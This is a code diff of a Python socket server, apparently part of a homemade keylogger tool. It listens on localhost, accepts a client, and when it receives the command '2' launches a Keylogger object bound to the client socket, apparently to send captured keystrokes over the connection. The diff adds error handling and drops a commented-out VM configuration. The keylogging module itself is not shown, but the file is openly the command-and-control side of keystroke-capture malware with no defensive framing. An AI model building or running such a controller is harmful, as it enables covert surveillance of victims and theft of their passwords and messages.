@@ -1,13 +1,8 @@
 import socket
-from pynput import keyboard
 from keylogger import Keylogger
 
-# # Server configuration VM
-# HOST = '0.0.0.0'  # Change to the desired IP address or '0.0.0.0' to listen on all available network interfaces
-# PORT = 12345
-
 # Server configuration local
-HOST = 'localhost'  # Change to the desired IP address or '0.0.0.0' to listen on all available network interfaces
+HOST = 'localhost'
 PORT = 12346
 
 # Create a socket server
@@ -21,23 +16,32 @@ print(f"Server is listening on {HOST}:{PORT}")
 client_socket, client_address = server_socket.accept()
 print(f"Accepted connection from {client_address}")
 
-while True:
-    # Perform communication with the client
-    data = client_socket.recv(1024)
-    if not data:
-        break  # Exit the loop when the client disconnects
+try:
+    while True:
+        # Perform communication with the client
+        data = client_socket.recv(1024)
+        if not data:
+            break  # Exit the loop when the client disconnects
 
-    data = data.decode()
-    print(f"Received: {data}")
+        data = data.decode('utf-8')
+        if data == '2':
+            try:
+                keylogger = Keylogger(client_socket)
+                keylogger.start()
+            except (ConnectionResetError, BrokenPipeError):
+                print("Client disconnected.")
+                break
 
-    if data == '2':
-        print("Launch keylogger")
-        Keylogger = Keylogger(client_socket)
-        Keylogger.start()
+except KeyboardInterrupt:
+    print("Server is stopping")
+finally:
+    if client_socket:
+        try:
+            client_socket.send("Server is disconnecting".encode())
+            client_socket.close()
+            print(f"Client disconnected from {client_address}")
+        except (ConnectionResetError, BrokenPipeError):
+            print("Client disconnected abruptly.")
 
-# Close the client socket
-client_socket.close()
-print(f"Client disconnected from {client_address}")
-
-# Close the server socket (optional)
-server_socket.close()
+    # Close the server socket (optional)
+    server_socket.close()
